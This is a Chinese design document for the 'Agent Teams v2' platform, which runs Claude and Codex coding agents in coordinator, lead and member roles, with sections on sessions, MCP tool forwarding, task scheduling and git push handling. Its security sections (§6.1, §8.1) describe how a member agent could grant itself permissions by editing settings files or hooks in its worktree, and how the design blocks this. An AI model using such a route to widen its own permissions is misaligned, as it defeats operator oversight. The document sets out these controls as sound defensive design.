# Agent Teams v2 架构

状态：设计稿（2026-11-14）。本目录的文件一起构成 v2 的实现约定：

| 文件 | 内容 |
| --- | --- |
| `architecture.md`（本文） | 总体结构、组件职责、技术选型、各流程、安全、部署、分阶段交付与迁移 |
| `protocol.md` | 控制台 ↔ 节点守护进程的 WebSocket 协议（v2） |
| `data-model.md` | PostgreSQL 表结构，以及和现有 `at_*` 表的对应 |
| `api.md` | 网页用的 REST + SSE 接口，按设计稿画板分组 |
| `office-layout.md` / `office-layout.schema.json` / `office.example.json` | 办公室布局 JSON 格式、Schema、和设计稿一致的示例 |

界面以设计稿为准：https://claude.ai/artifact/ETVxwwc77PFUpjsai9mmoi （Main、Overview、Thread、Deliverables、NewProject、ProjectSettings、Team、Nodes、GitHub、Admin、Login、Office、Mobile）。产品模型沿用 `docs/threads.md` 和 `docs/agent-comms.md`，本文只在必要处改动，改动处会写明。

---

## 1. 一句话

Go 写的控制台（REST + SSE + 节点 WebSocket + 调度器）存全部状态在 PostgreSQL，用 Valkey 做实时扇出和锁；每台节点跑一个 TypeScript 守护进程，用 Claude Agent SDK 托管 Claude Code 员工的**常驻会话**，用 `codex app-server` 托管 Codex 员工；员工的平台工具（派活、提问、set_status…）由守护进程在本机提供 MCP，调用经节点 WebSocket 转到控制台执行；React 网页按设计稿重做，办公室由一个 JSON 布局文件驱动渲染。

## 2. 总体结构

```
                         浏览器（React + Tailwind + Radix/shadcn）
                         │  REST (JSON)   │  SSE /api/.../events (Last-Event-ID 可续)
                         ▼                ▼
┌──────────────────────── Caddy（TLS，flush_interval -1） ────────────────────────┐
└──────────────────────────────────────┬──────────────────────────────────────────┘
                                       ▼
┌──────────────────────────── control plane（Go，单二进制 `atctl`） ──────────────┐
│ httpapi (chi + huma, OpenAPI 3.1)   sse hub          nodegw (WS /nodes/connect)  │
│ auth / projects / git / admin       ▲  ▲             │  链路注册、命令发件箱、ACK   │
│ threads / tasks / approvals         │  │             │  事件收件 → 各引擎           │
│ ┌─────────── 领域引擎（同进程 goroutine，状态全在 PG） ─────────────┐           │
│ │ orchestrator  会话编排（谁该有会话、开在哪台节点、恢复）          │           │
│ │ scheduler     任务池领取 / 依赖 / 主任务打勾                       │           │
│ │ toolsvc       平台工具（统筹/组长/成员）的实现，tool.call 入口     │           │
│ │ approvals     审批策略（跳过确认 / 本串全部放行 / 记住的规则）     │           │
│ │ status        员工状态机：事件 → 状态 → 落库 → 推送                │           │
│ │ delivery      分支 / 合并队列 / CI(Checks) / PR / 验收             │           │
│ │ github        App 令牌、REST 客户端、webhook（可选）、轮询          │           │
│ └────────────────────────────────────────────────────────────────────┘           │
│ legacy proxy（迁移期）：未迁移的用户和路径反向代理到 Python v1                    │
└───────┬──────────────────────────────┬───────────────────────────────┬───────────┘
        ▼                              ▼                               ▼
   PostgreSQL 17                  Valkey 9                       Python v1（迁移期，内网）
   全部业务数据、事件流、           pub/sub 扇出、分布式锁、          旧会话/旧节点协议 1
   发件箱、审计                     限流计数、在线状态
        ▲
        │ WS（协议 v2，TLS，节点令牌）
┌───────┴──────────────── 节点守护进程（TypeScript / Node 22，`agent-teams-node`） ─────┐
│ link        连接、hello/版本协商、发件日志(outbox)、命令去重、重放                    │
│ sessions    ┌ ClaudeDriver：每个会话一个 Agent SDK query()（流式输入、interrupt、      │
│             │              canUseTool、hooks） → 内置 claude 2.1.x 子进程              │
│             └ CodexDriver：每个 CODEX_HOME 一个 `codex app-server`（JSON-RPC stdio），│
│                            一个员工 = 一个 Codex thread                                │
│ toolhost    平台 MCP：Claude 用进程内 SDK MCP server；Codex 用 127.0.0.1 回环 HTTP MCP │
│             两者把 tools/call 变成 WS `tool.call` 交给控制台                            │
│ git         clone / fetch / worktree add / cleanup / status（只做本地操作）           │
│ cred        git credential helper + gh 包装：按需向控制台要短期 GitHub 令牌，不落盘   │
│ legacy      协议 1 兼容：start/output/exit/cancel（迁移期让 Python 也能用新守护进程） │
└────────────────────────────────────────────────────────────────────────────────────┘
```

## 3. 组件与职责

### 3.1 控制台（Go，`/server`）

- **对外**：网页 REST（`/api/...`）、SSE（项目级 + 用户级）、节点 WebSocket（`/nodes/connect`，别名 `/nodes/v2/connect`）、GitHub App 回调（沿用 v1 路径 `/api/git/github-app/created`、`/installed`，必须不变，否则要去 GitHub 改 App 设置）、可选 webhook（`/api/git/github-app/webhook`）、`/install-node.sh`、`/node/dist/*`（守护进程发布包）、`/healthz`、`/readyz`、`/metrics`（只监听内网端口）。
- **领域引擎**（同一进程内的模块，状态全在 PG，进程可随时重启）：
  - `orchestrator`：根据项目 / 讨论串 / 任务状态算出“哪些员工该有会话”，挑节点，发 `session.open`；节点断线、会话出错、守护进程重启后负责恢复（`resume`）。
  - `scheduler`：任务池。按岗位领取、依赖、空闲实例、主任务自动打勾、失败重试。
  - `toolsvc`：所有平台工具的实现（见 §6）。守护进程只是转发。
  - `approvals`：审批请求的策略判断、卡片、答复回送。
  - `status`：员工状态机，事件落库、推送、回放。
  - `delivery`：讨论串分支、合并队列、CI、PR、验收、清理。
  - `github`：App JWT / 安装令牌缓存（进程内 + Valkey 共享），REST 客户端（分页、ETag、限速），Checks 轮询。
  - `legacy`：迁移期的反向代理（§14.1）和对 Python 内部接口的调用（§14.5：切断用户、断开节点、清令牌缓存、读 v1 节点实时状态）。
- **单实例起步，可横向扩展**：v2.0 先跑 1 个副本。所有状态在 PG；节点链路只挂在一个副本上，副本间用 Valkey 频道 `node:<id>:cmd` 转发命令（§11.4），以后加副本不改协议。调度器、合并队列这类“全局只能一个在跑”的循环用 PG advisory lock 选主。

### 3.2 节点守护进程（TypeScript，`/node`）

- 一台机器一个进程，systemd 用户服务，`Restart=always`。
- 托管会话（Claude / Codex）、本地 git 操作、平台工具转发、GitHub 凭证按需获取、协议 1 兼容执行。
- **不做业务决策**：派给谁、是否放行、任务池，全在控制台。守护进程只执行明确的命令，以及在本机强制“这个会话能用哪些工具”（防线之一，见 §10）。

### 3.3 网页（React，`/web`）

- 沿用现有技术栈（React 18 + Vite 7 + Tailwind 3 + Radix/shadcn 风格组件 + react-query 5 + react-router 6），页面按设计稿重做。组件仍然只用 `components/common` + `components/ui`。
- 接口类型由控制台导出的 OpenAPI 3.1 生成（`openapi-typescript` + `openapi-fetch`），不再手写 `lib/api.ts` 的类型。
- 办公室页：Canvas 2D 画场景和人物，DOM 叠加层画气泡、名牌、门牌和可点区域；布局来自 JSON（`office-layout.md`）。

### 3.4 共享协议（`/protocol`）

- 节点协议、平台工具、办公室布局的 **JSON Schema（draft 2020-12）是唯一来源**；Go 结构体和 TS 类型都从它生成，CI 检查生成物没被手改。
- REST 接口不放这里：由 Go 代码（huma）生成 OpenAPI，再生成网页的 TS 类型。

## 4. 仓库布局

一个仓库（monorepo），Python v1 在迁移期保留在原位置，退役后删除。

```
/server                 Go module  github.com/<org>/agent-teams/server
  cmd/atctl/            main：serve | migrate | healthcheck | openapi | admin（重置密码等运维命令）
  internal/httpapi/     路由、huma 操作、中间件（会话、CSRF、限流、审计）
  internal/sse/         SSE hub（Valkey 订阅 + PG 回放）
  internal/nodegw/      节点 WebSocket、链路注册、命令发件箱
  internal/orchestrator/ internal/scheduler/ internal/toolsvc/ internal/approvals/
  internal/status/      internal/delivery/  internal/github/   internal/office/
  internal/auth/        scrypt、会话、Fernet（兼容 v1 的 SecretBox）
  internal/store/       sqlc 生成的查询 + 事务封装
  internal/legacy/      迁移期反向代理到 Python
  migrations/           goose SQL 迁移（嵌入二进制）
  queries/              sqlc 的 .sql
/node                   TS 守护进程（npm 包 @agent-teams/node）
  src/link/  src/sessions/claude/  src/sessions/codex/  src/toolhost/
  src/git/   src/cred/   src/legacy/   src/journal/   src/cli.ts
  src/codex-protocol/   由 `codex app-server generate-ts` 生成，提交入库，锁定 CLI 版本
/web                    React 应用（构建产物由控制台静态服务）
  src/office/           布局加载、场景编译、渲染器、寻路、回放
/protocol
  schemas/node/*.json   节点协议消息
  schemas/tools/*.json  平台工具参数/返回
  schemas/office/office-layout.schema.json（= docs/v2/office-layout.schema.json）
  gen/go/  gen/ts/      生成物
/office                 默认办公室布局 JSON 与像素素材（部署时挂进控制台容器）
/deploy                 compose、Caddy 片段、deploy.sh、install-node.sh 模板
/src, /tests, pyproject.toml   v1（迁移期保留，P6 后删除）
```

## 5. 技术选型（带版本和理由）

版本是开工时的下限；开工当天锁到当时最新补丁版本，之后由 Renovate 升级。

### 5.1 控制台（Go）

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 语言 | Go 1.25（`go.mod` 写 `go 1.25`，`toolchain` 锁补丁） | 标准库 `net/http` 路由模式、`log/slog`、`iter` 都够用 |
| 路由 | `github.com/go-chi/chi/v5` v5.2 | 纯 `net/http`，中间件生态成熟，和 huma 适配 |
| API 层 | `github.com/danielgtaylor/huma/v2` v2.3x（chi 适配器） | 由 Go 结构体生成 OpenAPI 3.1 和校验，网页类型自动生成；原生支持 SSE 操作 |
| PG 驱动 | `github.com/jackc/pgx/v5` v5.7（`pgxpool`） | 最快、支持 `LISTEN/NOTIFY`、`COPY`、类型齐全 |
| SQL | `sqlc` v1.29（pgx/v5 引擎） | 手写 SQL，生成类型安全代码；不用 ORM |
| 迁移 | `github.com/pressly/goose/v3` v3.26，SQL 迁移嵌入二进制 | 支持 Go 迁移（数据转换，例如团队 YAML → 岗位模板），有 `goose_db_version` 表；`atctl migrate up` 在启动前单独跑 |
| Valkey | `github.com/valkey-io/valkey-go` v1.0 | Valkey 官方客户端，自动 pipeline、RESP3、客户端缓存；pub/sub 和锁都用它 |
| WebSocket | `github.com/coder/websocket` v1.8 | 上下文友好、并发写安全、支持压缩；`gorilla/websocket` 维护不稳定 |
| JSON Schema 校验 | `github.com/santhosh-tekuri/jsonschema/v6` | draft 2020-12 完整实现；校验节点消息（开发 / 测试环境全量，生产抽样）和办公室布局（每次加载） |
| Schema → Go | `github.com/omissis/go-jsonschema`（`go generate`） | 从 `/protocol/schemas` 生成结构体 |
| 密码 | `golang.org/x/crypto/scrypt` | 兼容 v1 的 `scrypt$N$r$p$salt$digest` |
| 密封 | `github.com/fernet/fernet-go` | 兼容 v1 SecretBox：key = `urlsafe_b64(sha256(AGENT_TEAMS_SECRET_KEY))` |
| GitHub | `github.com/google/go-github`（开工时最新大版本）+ `github.com/bradleyfalzon/ghinstallation/v2` | App JWT、安装令牌、分页；令牌缓存外面再包一层 Valkey 共享缓存 |
| 文件监听 | `github.com/fsnotify/fsnotify` v1.8 | 办公室布局文件热更新 |
| 日志 / 指标 / 追踪 | `log/slog`（JSON）、`prometheus/client_golang`、OpenTelemetry Go（OTLP，可选） | 见 §13 |
| MCP | **v2.0 控制台不提供 MCP 服务** | 平台工具由守护进程在本机提供（§6.3），控制台只收 `tool.call`。以后若要对外开放 MCP，用官方 `github.com/modelcontextprotocol/go-sdk`（streamable HTTP handler），备选 `mark3labs/mcp-go` |

### 5.2 守护进程（TypeScript）

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 运行时 | Node.js 22 LTS（≥22.12；24 LTS 也测） | Agent SDK 要求 ≥18.14；22 有稳定的 `fetch`、`WebSocket` 客户端、`--env-file` |
| Claude | `@anthropic-ai/claude-agent-sdk` **0.3.325，精确锁版本** | 实测：节点已有的订阅登录可用（`apiKeySource:'none'`）；流式输入多轮同一会话；锁 SDK 即锁内置 `claude` 2.1.325 |
| Codex | `@openai/codex` CLI **0.169.0，精确锁版本**，跑 `codex app-server`（stdio JSON-RPC） | 只有 app-server 能发审批请求、`turn/steer` 中途插话、`turn/interrupt`、`thread/resume`；`@openai/codex-sdk` 只包了 `codex exec`，审批被强制为 Never，不能用 |
| WS 客户端 | `ws` 8.18 | 稳定、支持 ping/pong、`maxPayload`、代理 |
| MCP（Codex 回环） | `@modelcontextprotocol/sdk` 1.32（Agent SDK 的 peer 依赖，同一份） | streamable HTTP server，实测 Codex 能连 |
| 校验 | `ajv` 8（JSON Schema 2020-12）+ `zod` 4（Agent SDK 的 `tool()` 需要） | 入站命令用 ajv 按 `/protocol` 校验 |
| 本地日志 | 追加写 JSONL（`state/outbox/*.jsonl`、`state/sessions/*.json`） | 和 v1 一样朴素可靠，不引入 SQLite；文件小、可读、好排查 |
| 日志 | `pino` 9 | JSON 日志，journald 友好 |
| 打包 | `esbuild` 0.25 打成 `dist/node.mjs`，**`@anthropic-ai/claude-agent-sdk`、`@openai/codex`、`@modelcontextprotocol/sdk` 标为 `external`**，作为普通依赖装在 `dist/` 旁边的 `node_modules`（tgz 带精确锁定的 `package-lock.json`，`npm ci --omit=dev`） | 这两个包按自身模块位置查找平台二进制（`<pkg>-linux-<arch>/claude`、codex 原生二进制），打进单文件会找不到。控制台 `/node/dist/` 发布签名的 tgz；不再从 Git 分支安装（v1 问题 13） |

### 5.3 网页

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 框架 | React 18.3 + Vite 7 + TypeScript 5.9（保持） | 现有代码和组件可复用；React 19 升级不在关键路径上 |
| UI | Tailwind 3.4 + Radix + shadcn 风格组件（保持） | 设计稿就是按这套画的 |
| 数据 | react-query 5 + `openapi-fetch` + `openapi-typescript` 7 | 类型来自 OpenAPI，SSE 事件直接写进 query 缓存 |
| 办公室渲染 | Canvas 2D（`imageSmoothingEnabled=false`）+ DOM 叠加层，**不引入 PixiJS** | 几十个人物、几百件家具 Canvas 2D 足够；中文气泡用 DOM 渲染更清晰、可点、可读屏；零依赖，布局热更新只需重编译场景 |
| 布局编辑 | 先用 JSON 文本编辑（CodeMirror 6 + JSON Schema 补全），可视化编辑器后续再说 | 用户要求“只改 JSON 就能重画” |

### 5.4 共享类型生成

- `/protocol/schemas/**/*.json` → Go：`go-jsonschema`；TS：`json-schema-to-typescript` 15；运行时校验：Go `santhosh-tekuri/jsonschema`、TS `ajv`。
- REST：huma 生成 `openapi.json`（`atctl openapi > web/src/api/openapi.json`），网页 `openapi-typescript` 生成 `schema.d.ts`。
- `make gen` 一次生成全部；CI 跑 `make gen && git diff --exit-code`。

## 6. 员工、会话与平台工具

### 6.1 三层角色到会话的映射

| 层级 | 每个… | 会话类型 | 工作目录 | 内置工具 | 权限 | 平台工具集 |
| --- | --- | --- | --- | --- | --- | --- |
| 项目统筹（coordinator） | 项目 1 个 | Claude，常驻 | `projects/<pid>/coordinator`（空目录，不克隆） | `tools: []`（一个内置工具都没有） | `permissionMode:'dontAsk'` + PreToolUse 钩子只放行 `mcp__platform__*` | coordinator |
| 组长（lead） | 讨论串 1 个 | Claude（或 Codex），常驻 | `projects/<pid>/threads/<no>/lead`（讨论串分支的 worktree） | `Read, Glob, Grep, Bash` | `dontAsk`；`disallowedTools: Edit, Write, NotebookEdit`；**只读策略**（§10.2：Bash argv 白名单 + Claude Bash 沙箱无可写路径 + 文件工具限 cwd） | lead |
| 成员（member） | 讨论串 × 岗位 × count | Claude 或 Codex，常驻 | `projects/<pid>/threads/<no>/<name>`（分支 `thread/<no>/<name>`） | 按岗位模板 | `default`（审批走 canUseTool → 网页卡片）；岗位“跳过权限确认”= `bypassPermissions`；岗位 `read_only`（审查岗、决策岗默认开）= 与组长相同的只读策略 | member（+ `can_delegate` 时有派子任务） |

Codex 对应：组长和 `read_only` 岗位 `sandbox: read-only, approvalPolicy: never`；成员 `sandbox: workspace-write, approvalPolicy: on-request`，并在 `thread/start.config` 里设 `sandbox_workspace_write.writable_roots = [<shared>/.git]`（worktree 的对象库和 refs 在共享克隆的 `.git` 里，不在 cwd 下，否则每次 `git commit` 都会被沙箱拦或弹审批）和 `sandbox_workspace_write.network_access = true`（装依赖需要；推送不靠它，见 §8.1）；跳过确认 = `danger-full-access + never`。P3 的 SDK/Codex 验收脚本要实测 Codex 成员在 worktree 里能 `git commit`。

所有 Claude 会话固定：

- `settingSources: []`（**所有层级**，不读节点用户的 `~/.claude`，也不读仓库的 `.claude/settings.json`、`.mcp.json`：那里面可以有钩子（任意 shell 命令，不经权限检查）、`permissions.allow`、`env` 和 MCP 服务器，而成员能在自己的 worktree 里改这些文件，下一次 park→resume 就会被读入，等于自己给自己放权，也会破坏组长的只读保证）。仓库的 `CLAUDE.md` 由控制台经 GitHub API 从**基准分支**读取（不是从 worktree 读），拼进 `systemPrompt.append`；讨论串开工时读一次，基准分支变化后下一次开会话时刷新。若以后要重新考虑 `'project'`，必须同时通过 `settings` 传 `disableAllHooks: true` 并拒绝项目 MCP 服务器。
- `permissionMode` **总是显式设置**（不设可能落到 `auto`）。
- `systemPrompt: {type:'preset', preset:'claude_code', append: <平台说明 + 角色说明 + 项目 CLAUDE.md + 项目上下文 + 项目记忆摘要 + 名单>}`。
- `env` 由守护进程**逐项构造**（SDK 的 `env` 是替换不是合并）：`PATH`、`HOME`（见 §10.3，指向员工专用的 HOME）、`LANG`、`MCP_TOOL_TIMEOUT=86400000`、`CLAUDE_AGENT_SDK_CLIENT_APP=agent-teams-node/<ver>`、git 凭证相关变量，再加 `node.env` 里 `AGENT_TEAMS_PASS_ENV` 列出的认证与网络变量（默认允许名单：`ANTHROPIC_API_KEY`、`ANTHROPIC_BASE_URL`、`ANTHROPIC_AUTH_TOKEN`、`CLAUDE_CODE_USE_BEDROCK`、`CLAUDE_CODE_USE_VERTEX`、`AWS_*`、`CLOUD_ML_REGION`、`ANTHROPIC_VERTEX_PROJECT_ID`、`GOOGLE_APPLICATION_CREDENTIALS`、`HTTPS_PROXY`、`HTTP_PROXY`、`NO_PROXY`、`NODE_EXTRA_CA_CERTS`、`SSL_CERT_FILE`；Codex 另加 `OPENAI_API_KEY`、`OPENAI_BASE_URL`），节点 hello 报告 `auth: api_key` 时据此生效。`AGENT_TEAMS_NODE_TOKEN` 和 `AGENT_TEAMS_*` 前缀**永远剔除**，名单里写了也不带。
- `includeHookEvents: true`；Bash 沙箱按 §10.3 开启。
- `canUseTool` 返回 `updatedPermissions` 前，守护进程把每一条 `PermissionUpdate.destination` **改写为 `'session'`**（SDK 建议里的 `localSettings`/`projectSettings` 会往 worktree 写 `.claude/settings.local.json`）。

### 6.2 “逻辑会话”和“进程”分开

- **逻辑会话**（`at_agent_sessions` 一行）：属于某个员工实例，记录 SDK `session_id` 或 Codex `thread.id`、节点、cwd、分支、状态。员工存在多久它就存在多久（统筹跟项目一样久，组长和成员跟讨论串一样久）。
- **进程**：Claude 会话对应一个 `query()` 子进程（约 250 MB）。空闲超过 `park_after`（默认 15 分钟，无运行中的回合、无待审批）就 `close()` 掉进程，会话标为 `parked`；下一条消息到来时用 `resume: <session_id>` 重开。这样一台节点可以挂几十个逻辑会话，同时活跃的进程受 `max_active_sessions`（默认 4，节点 hello 上报，可在节点页调）限制。
- Codex：一个 `codex app-server` 托管该节点所有 Codex 会话（同一 `CODEX_HOME`）；空闲 thread 不占额外进程，app-server 重启后 `thread/resume {excludeTurns:true}`。
- 守护进程重启：从 `state/sessions/*.json` 知道本机有哪些逻辑会话，但**不主动恢复**；等控制台在重连后按需重新 `session.open {resume}`（控制台是唯一的真相）。
- **会话钉在节点上**：Claude 转录（员工 HOME 下的 `.claude/projects`）和 Codex rollout（`$CODEX_HOME/sessions`）只存在于跑过它的节点，所以 `resume` 只发给 `at_agent_sessions.node_id` 那台节点。必须换节点时（节点被删、离线超过 `rehome_after`（默认 30 分钟）且员工有待办任务、节点 drain），orchestrator 关闭旧逻辑会话，在新节点开一个**全新**会话（`resume: null`），第一条消息是平台生成的交接摘要：员工身份、当前任务与说明、主任务计划、该员工最近 20 条消息/留言、未完成的提问、分支名与最近提交（`git.status`）。`resume` 失败（守护进程回 `session.opened {resume_failed: true}`，例如转录被清理）时自动走同一个交接流程，不需要人处理。不做转录同步（SDK `sessionStore` 以后可作为改进）。

### 6.3 平台工具：守护进程本地 MCP + WS 转发

v1 的 `/mcp` 每任务一个 bearer 令牌，存在内存里，重启全失效，令牌还出现在命令行里（v1 问题 2、12）。v2 改为：

```
Claude 会话 ──(进程内 SDK MCP server "platform")──┐
                                                  ├─► toolhost ──WS tool.call{call_id}──► 控制台 toolsvc
Codex 会话 ──(http://127.0.0.1:<port>/mcp/<sid>/<每次 ─┘                ◄── tool.result{call_id} ──
              start/resume 换新的随机秘密>)
```

- 会话打开时，控制台在 `session.open` 里下发该会话的工具清单（名字、描述、JSON Schema，来自 `/protocol/schemas/tools`），守护进程据此注册工具。工具名在 Claude 里是 `mcp__platform__<tool>`，在 Codex 里是 namespace `mcp__platform` 下的 `<tool>`（实测 Codex 只认 namespace 形式）。
- Codex 回环端点只监听 127.0.0.1。秘密放在**每会话 URL 路径**里（`/mcp/<sid>/<随机 32 字节>`），不用 `http_headers`，因为 `thread/start.config` 可能被写进 `$CODEX_HOME` 下的 rollout 文件。每次 `thread/start` **和每次 `thread/resume`** 都重新下发完整的 `mcp_servers.platform` 配置并换新路径（旧路径立即失效），所以守护进程重启后令牌重生也不影响已恢复的 thread；rollout 里即使留下旧 URL 也已作废。其余配置：`default_tools_approval_mode = "approve"`（否则每次调用都弹 elicitation）、`tool_timeout_sec = 86400`。P3 验收脚本检查 rollout 是否持久化了 config，以及 `thread/resume` 带新 config 是否生效；若 resume 不接受 mcp 配置，退路是 resume 后立即 `config/value/write` 覆盖该会话的 `mcp_servers.platform.url`。
- 守护进程把调用包成 `tool.call {call_id, session_id, tool, args, tool_use_id?}`。`call_id` 由**守护进程在处理器被调用时生成**（`tc_` + ULID，写进本机日志后再发，重启后重发用同一个值）；进程内 SDK MCP 处理器拿不到 Claude 的 tool_use_id，能通过 PreToolUse 钩子（同一回合、同工具名、同参数）对上时另外记 `tool_use_id`，Codex 记 item id，仅供排查和办公室显示。**幂等**：控制台在 `at_tool_calls`（主键 `(session_id, call_id)`）记下，断线重连后守护进程重发未完成的调用，控制台对已完成的直接回原结果、对进行中的不重复执行。
- 阻塞型工具（`ask_lead`、`ask_user`、`request_review`、`wait_task`）在控制台挂起，答复后才回 `tool.result`。控制台重启不影响（调用记录在 PG，答复事件触发补发结果）。
- **未验证点与退路**：进程内 SDK MCP 工具处理器能否挂起数小时没有实测。退路（开关 `tools.blocking=false`）：阻塞型工具改为立即返回“已提问 q5，答案到了会作为消息发给你，请先结束本回合等待”，答案到达时用 `session.send {priority:'now'}` 推进会话。常驻流式会话让这个退路很自然，P3 先实测再定默认值。

平台工具清单（在 v1 / threads.md 基础上）：

- **coordinator**：`open_thread(title, brief, roles?)`、`list_threads(status?)`、`thread_status(no)`、`message_thread(no, text)`、`ask_user(question, options?)`（不阻塞）、`remember(text)`、`set_status(text, kind?)`。
- **lead**：`update_plan(steps)`（主任务）、`assign_task(assignee, instruction, main, depends_on?, kind?)`（assignee 可以是岗位名 → 进任务池）、`list_tasks`、`cancel_task`、`reply_to(question_id, answer)`、`broadcast`、`send_message`、`ask_user`（不阻塞）、`enqueue_merge(member | task_id)`（进合并队列，取代 v1 设计里的 `merge_member` 直接合并）、`open_pr(title, body)`、`finish(summary)`、`publish_deliverable(kind, title, url)`、`set_status`。`finish(summary)` 除了写 `at_threads.summary`，还插入一条 `at_project_memory {source: '#<no>', text: summary}` 并发 `memory` 事件（threads.md 的约定）。
- **member**：`complete_task(task_id, summary, artifacts?)`（**显式完成**，见 §7.3；调用前平台先替它推送分支，见 §8.1）、`push_branch()`（把当前 worktree 的 HEAD 推到自己的成员分支，见 §8.1）、`report_progress`、`ask_lead`（阻塞）、`ask_user`（阻塞）、`send_message`、`read_messages`、`list_team`、`get_task`、`request_review`（阻塞）、`publish_deliverable`、`set_status`；`can_delegate` 时加 `assign_subtask`、`wait_task`。
- 审批不再是 MCP 工具（v1 的 `approve`），改走 canUseTool / Codex requestApproval（§8）。

### 6.4 消息怎么推给员工

所有“给员工的话”都变成 `session.send`：用户插话、统筹 → 组长（`message_thread`）、派活、员工间留言（收件人在忙时作为 `priority:'later'` 排队，空闲时立即开回合）、`[Answer to q5]`、`[Thread #12 · review]`、CI 失败通知，以及**小任务完成通知**：成员 `complete_task` 后给组长发 `[Task t7 · dev-1 · done] <summary>`（`priority:'later'`；失败为 `· failed`），组长据此审查并 `enqueue_merge`（对应 v1 的 `[Task t1 · dev · done]\n<output>`）。若审查关卡开着且有审查岗，任务先进 `review` 由审查岗领取，通知改为在审查通过（或驳回）后发给组长，内容带审查结论。

- Claude：守护进程维护一个异步队列作为 `query()` 的 `prompt`；`priority` 原样带上（`now` 会打断当前回合，只用于用户点“插话并打断”和中止类指令）。
- Codex：空闲时 `turn/start`；回合进行中用 `turn/steer {expectedTurnId}`；`later` 由守护进程排队到 `turn/completed` 后再发。
- 消息在控制台有 `msg_id`（落库于 `at_messages`），守护进程按 `msg_id` 去重，投递后回 `session.delivered`。Claude 的 `SDKUserMessage.uuid` 就用 `msg_id`，守护进程重启后（本机去重表可能缺最后几条）在 resume 时扫描转录里已有的 user 消息 uuid，已投递的不再推（协议 §2.2）。

## 7. 讨论串、调度与任务池

### 7.1 讨论串生命周期

```
queued ──开工──► running ◄──► waiting（有等你处理的卡片 / 组长在等用户）
   │               │
   │               ├──► review（open_pr 后） ──accept / 自动合并（§8.4）──► done ──► archived
   │               │                 └──reject / CI 失败──► running
   │               ├──► paused（用户暂停：中断所有回合，会话 park，任务池停止派发）
   └───────────────┴──► failed（组长报告失败或不可恢复错误）
```

开工（`queued → running`）由 orchestrator 做。同一用户（跨项目）同时处于 `running` 或 `waiting` 的讨论串数（Admin 页“每人最多同时运行的讨论串”）受 `max_running_threads` 限制（全局默认在 `at_settings.platform.max_running_threads`，默认 3；`at_users.max_running_threads` 可单独覆盖，NULL = 用全局），超出的新串停在 `queued`，有串结束或暂停时按创建顺序开工；Thread 页对排队的串显示“排队中（前面还有 n 个）”。

1. 分配编号与分支名 `thread/<no>-<slug>`；GitHub API 从基准分支建 ref（已存在跳过）。
2. 按岗位模板实例化员工 `<role>-<n>`（写 `at_employees`），节点在岗位 `nodes` 里按“当前活跃会话最少”挑，不再是纯轮转。
3. 给组长发 `git.prepare`（worktree）+ `session.open`，第一条消息 = 统筹的 brief。
4. 成员**懒启动**：任务池里有该岗位可领的任务时才开会话（省进程、省额度）。

讨论串的“等你处理”数 = open 的 user 提问 + 待审批卡片 + （review 状态时）验收。

### 7.2 两级任务

- **主任务**（`at_main_tasks`）= 组长 `update_plan` 的步骤，带稳定 id；小任务通过 `main_task_id` 挂在下面。组长改计划时按标题匹配保留 id。
- **小任务**（`at_tasks`）状态：`pending`（池中待领）→ `claimed` → `running` → `review`（等审查岗）→ `decision`（等决策岗，可选）→ `merging`（在合并队列里）→ `done`；以及 `failed`、`cancelled`、`blocked`（依赖未满足）。关卡开关在项目设置（交付流程）里，关掉的关卡直接跳过。
- 主任务下全部小任务 `done` → 主任务自动 `done`（组长也可手动改）。

### 7.3 任务池调度

- 触发：任务新建 / 状态变化、员工会话变空闲（turn 结束且无运行中任务）、节点上线、定时（每 10 s 兜底）。触发写 Valkey 频道 `sched:<thread>`，调度循环（advisory lock 选主）消费。
- 领取：一个 SQL 事务里 `SELECT … FROM at_tasks WHERE thread_id=$1 AND status='pending' AND role=$2 AND deps_satisfied ORDER BY priority, created_at FOR UPDATE SKIP LOCKED LIMIT 1`，配上“该岗位空闲实例”`SELECT … FROM at_employees WHERE … AND NOT EXISTS (running task) FOR UPDATE SKIP LOCKED`，一起改成 `claimed`。
- 领取后发事件 `task.claimed`（办公室里那人“走到任务板 → 领取 → 回工位”就由它驱动），再给该成员 `session.send`（必要时先 `git.prepare` + `session.open`）。消息正文 = 任务说明 + 依赖任务的结果摘要 + 简报（名单、未读留言）。
- **完成判定**：成员调用 `complete_task` 才算完成；完成后按 §6.4 通知组长。若回合结束（`result`）而任务仍 running，平台推一条提醒“如果做完了请调用 complete_task；没做完请继续”；连续 2 次回合结束仍未完成 → 任务标 `blocked`，给组长发 `[Task t7 · dev-1 · 需要关注]`。这比 v1 “用最后一条 result 当输出”可靠，因为常驻会话里一个回合不等于一个任务。
- 一个成员同一时间只有一个 running 任务；`can_delegate` 的子任务也进同一个池。
- 失败重试：`complete_task` 报失败或会话崩溃时任务回池（`attempt+1`，上限 2），超限 `failed` 并通知组长。

## 8. 分支、worktree、合并队列、CI、PR

### 8.1 目录和分支

```
<root>/projects/<pid>/repo                    共享克隆（普通克隆，主工作区停在基准分支，没人在里面干活，只用来 fetch 和挂 worktree）
<root>/projects/<pid>/coordinator             空目录
<root>/projects/<pid>/threads/<no>/lead       worktree，分支 thread/<no>-<slug>（只读用）
<root>/projects/<pid>/threads/<no>/<name>     worktree，分支 thread/<no>/<name>，基于讨论串分支
```

- `git.prepare {mode: worktree|clone, shared, cwd, branch, base}`：没有共享克隆就 clone；`git -C shared fetch origin --prune`；目标不是 worktree 就 `git -C shared worktree add -B <branch> <cwd> origin/<base or branch>`。clone 模式沿用 v1。
- 每台节点上每个项目一份共享克隆；同一节点上的 fetch / worktree 操作按项目加文件锁（`shared/.git/agent-teams.lock`），避免并发 `worktree add` 打架。
- **员工手里没有写令牌**（§10.4）：成员自己 `git commit`，但推送由平台做。成员调用 `push_branch()`（`complete_task` 和 `enqueue_merge` 前平台也会自动调用）→ 控制台发 `git.push {job_id, cwd, refspec: "HEAD:refs/heads/thread/<no>/<name>"}` 作业 → 守护进程用**只为这一个作业**申请的令牌（只给本仓库、`contents: write`）执行 `git push --no-verify origin <固定 refspec>`，令牌不进任何员工进程的环境。refspec 由控制台按员工身份生成，守护进程只接受 `refs/heads/thread/<no>/<employee>` 形式，所以无论 Bash、Codex、脚本还是 git 别名，员工都推不了讨论串分支和基准分支。讨论串分支只由控制台（合并队列，App 令牌）改动。
